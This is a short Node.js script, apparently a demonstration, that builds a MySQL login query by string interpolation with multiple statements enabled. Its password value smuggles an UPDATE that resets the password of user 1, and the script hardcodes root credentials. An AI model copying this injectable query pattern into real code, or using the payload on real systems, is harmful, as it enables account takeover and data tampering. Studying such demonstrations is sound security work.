const mysql = require('mysql');
const connection = mysql.createConnection({
	host     : '127.0.0.3',
	user     : 'root',
	password : '12345',
	database : 'fininfo_bd',
	multipleStatements: true
});

const login = "zetr";
//const password = "12345";
const password = "';UPDATE users SET password='hello_world' WHERE ID_USER=1; SELECT '1";

connection.query(`SELECT * FROM users WHERE LOGIN = '${login}' AND PASSWORD = '${password}';`, function (error, results, fields) {
	if (error) throw error;
	const amount = results.length;
	if (amount === 0) {
		console.log("Имя пользователя или пароль неправильные!");
	} else {
		console.log("Пользователь найден!");
		const user = results[0];
		console.log(user);
	}
});